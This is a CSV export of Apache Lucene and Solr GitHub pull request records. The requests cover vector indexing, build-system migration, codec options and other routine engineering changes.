"#","No","Issue Title","Issue Details","State","Labels","User name","created","Updated"
"","2123","SOLR-10732: short circuit calls to searcher#numDocs when base is empty","This avoids constructing redundant queries","open","","munendrasn","2020-12-07T05:58:03Z","2020-12-08T12:42:29Z"
"","1774","SOLR-14774: Create HealthCheckHandler in CoreContainer","This allows users to plug-in different implementations of the handler (they must extend HealthCheckHandler)  This PR also removes the HealthCheckHandler from the implicit SolrCore plugins","closed","","tflobbe","2020-08-22T03:57:03Z","2020-08-28T23:00:01Z"
"","2450","SOLR-15155: Let CloudHttp2SolrClient accept an external Http2SolrClient Builder","This allows configuring the internal client with things like timeouts, credentials, etc","closed","","tflobbe","2021-03-03T23:02:29Z","2021-03-12T22:45:18Z"
"","1685","LUCENE-9433: Remove Ant support from trunk","This adds the first pass at changing the documentation, especially README.md and ref guide files.  lucene/README.md is a major question, currently it has a nocommit in it.","closed","","ErickErickson","2020-07-20T23:15:51Z","2020-08-21T15:27:06Z"
"","2039","LUCENE-9587: Add '--illegal-access=deny' to test runner","This adds back the test runner option, so testing is strict with internal APIs.","closed","test-fix,","uschindler","2020-10-27T20:19:16Z","2020-10-27T22:28:29Z"
"","2069","LUCENE-9378: Make it possible to configure how to trade speed for compression on doc values.","This adds a switch to `Lucene80DocValuesFormat` which allows to configure whether to prioritize retrieval speed over compression ratio or the other way around. When prioritizing retrieval speed, binary doc values are written using the exact same format as before more aggressive compression got introduced.","closed","","jpountz","2020-11-09T17:57:35Z","2020-11-12T15:10:04Z"
"","2051","LUCENE-9594 Add linear function for FeatureField","This adds a linear function and newLinearQuery for FeatureField","closed","","mayya-sharipova","2020-10-30T20:52:36Z","2020-11-10T22:08:09Z"
"","1930","LUCENE-9322: add VectorValues to new Lucene90 codec","This adds a floating-point vector format building on the designs in Lucene-9004 and LUCENE-9322. This patch fully supports indexing and reading vectors with an iterator, and a random-access API. Support for search based on an NSW graph implementation is intended to follow soon, but I wanted to include the vector APIs that I needed to get that working, even though they are not yet used here, so eg it includes the definition of a scoring function and a nearest-neighbors search API, but no implementation of search yet. My intention is to keep the ANN implementation hidden, so graphs and other supporting data structures (eg we might want to support LSH or k-means clustering and so on) would be implementation details invoked by a configuration on the VectorField/VectorValues. At the moment you can specify a ScoringFunction, and it is implicit that NSW will be the result. In the future we could add another parameter to ScoringFunction and/or new functions to represent support for other algorithms.  Some open questions:   1. Should this be Lucene 9.0 only? In this patch I added Lucene90 Codec. If we do this then it would be awkward to backport. 2. It seems messy to have the ScoringFunction implementation in the main VectorValues interface API file. I'd appreciate any better suggestion for how to organize this. 3. Vector scoring can return negative numbers. I'd like to have first-class support for dot product distance (which can be negative) since that's what my consumers seem to have settled on. I don't think we need to be compatible with relevance scores, at least not directly in the KNN search API, but IDK maybe we should? We could renormalize/convert from dot-product scores to a positive score with math in the output layer where we return the scores. So far this is just specification question as there is no implementation of search yet. 4. I think there is room for improvement in some of the data structures used to map docids to dense vector ordinals and back. I'd appreciate comments on that, but maybe we could revisit in a fast follow-on issue?","closed","","msokolov","2020-09-29T15:58:46Z","2020-10-19T14:53:11Z"
"","2081","LUCENE-9413: Add CJKWidthCharFilter and its factory.","This adds a char filter (and its factory) which is the exact counterpart of o.a.l.a.cjk.CJKWidthFilter. The char filter would be useful especially for dictionary-based CJK analyzers; e.g. kuromoji.  https://issues.apache.org/jira/browse/LUCENE-9413","closed","","mocobeta","2020-11-14T19:11:37Z","2020-11-17T08:32:36Z"
"","2175","LUCENE-9652: DataInput.readFloats for use by Lucene90VectorReader","This adds `DataInput.readFloats`  and makes use of it in `Lucene90VectorReader`. The implementation and tests are essentially cloned from `readLELongs`. With these changes I observed definite speedups, although not as much as I expected from microbenchmarking. There's a fair amount of variability, but I see at least 20%, sometimes as much as 40% reduction in time for HnswGraph.search, as measured by KnnGraphTester.","closed","","msokolov","2020-12-31T16:48:00Z","2021-01-07T00:08:59Z"
"","2112","SOLR-14942: Move request registration to ContentStreamHandlerBase","This addresses review feedback [1] from David Smiley on Jira. It moves the request registration to the ContentStreamHandlerBase class instead of doing a hack-ish instanceof check inside HttpSolrCall.  [1] - https://issues.apache.org/jira/browse/SOLR-14942?focusedCommentId=17227639&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-17227639","closed","","shalinmangar","2020-12-01T13:45:21Z","2020-12-02T04:41:33Z"
"","2536","LUCENE-10032: Remove leafDocMaps from MergeState","These maps are no longer useful after LUCENE-8505.","closed","","dnhatn","2021-07-29T13:45:49Z","2021-07-29T14:45:07Z"
"","2105","Remove obsolete dev-tools scripts","These build files appear to be obsolete.  AFAICT, nothing calls them.  Let's delete them.","closed","","dsmiley","2020-11-28T22:17:25Z","2020-12-02T21:04:41Z"
"","1787","LUCENE-9483: Disable per-thread caching of buffers for decompression of stored fields.","These buffers can use lots of memory when the number of segments, threads or both is high.","closed","","jpountz","2020-08-26T09:25:28Z","2020-09-03T09:37:39Z"
"","1668","SOLR-13939: Extract any non-gradle related patches (deprecations, URL…","These are the thread leak changes from some work Mark Miller did quite a while ago. ""gradlew check"" passes, BUT I haven't examined the changes at all, I wanted to make it available ASAP for people to look at.  I don't even know if the approach _should_ be pushed. I've just mechanically grouped all the related changes in order to get a well-defined unit to examine.","closed","","ErickErickson","2020-07-13T13:01:18Z","2020-07-15T13:25:52Z"
"","1924","LUCENE-9544: Port Nori dictionary compilation","There is no script for Nori dictionary after the Ant build was deleted in [LUCENE-9433](https://issues.apache.org/jira/browse/LUCENE-9433).","closed","","danmuzi","2020-09-27T20:50:45Z","2020-09-28T09:44:33Z"
"","1795","LUCENE-9487: Add a null check on BooleanWeight","There is no null check for scorer in BooleanWeight.explain()  Signed-off-by: jeng832","closed","","jeng832","2020-08-28T13:11:06Z","2020-08-31T17:23:51Z"
"","2463","Install ACL package for Solr Docker tests Github action","There is currently an issue on the Ubuntu 20.04 github runner, with incorrect ownership being set for the `/var/solr` directory in the docker image.","closed","","HoustonPutman","2021-03-05T21:43:13Z","2021-03-05T23:29:44Z"
"","2103","Reconcile upgrade notes in master","The upgrade notes in ref-guide tends to sometimes be updated in 8.x branches only and not synced to master branch. This is an attempt, (inspired by and fixes #2102). I diffed the `branch_8x` version with master and saw that the 8x wording in most cases was more up to date. I tried to make sure that the updates are valid for 9.x, and skipped a few refguide links that I I believe may have been since removed, but have not tried to compile the refguide to detect its validity.","closed","","janhoy","2020-11-27T22:10:19Z","2020-12-02T22:28:08Z"
"","1881","SOLR-14876: Upgrade to zookeeper 3.6.2","The update netty ver 4.1.50 includes both security fixes and AArch64 performance improvements Refer release notes for detail: https://netty.io/news/2020/05/13/4-1-50-Final.html  Signed-off-by: odidev","closed","","odidev","2020-09-17T05:17:50Z","2020-09-21T01:33:35Z"
"","2108","LUCENE-9626 represent HNSW graph neighbors using primitive arrays","The subject line is the main thrust, but there are a few subsidiary changes that were needed in order to achieve that (see below), and I made a few incidental improvements to HNSW-related classes.  1. Add a primitive int-valued heap, IntHeap, based on the existing PriorityQueue 2. Convert scores to 16-bit precision in order to pack them into an int along with a neighbor ordinal  The result was about a 16% improvement in indexing times, and fewer, smaller GC pauses noted in profiler.","closed","","msokolov","2020-11-30T22:05:56Z","2020-12-09T20:41:17Z"
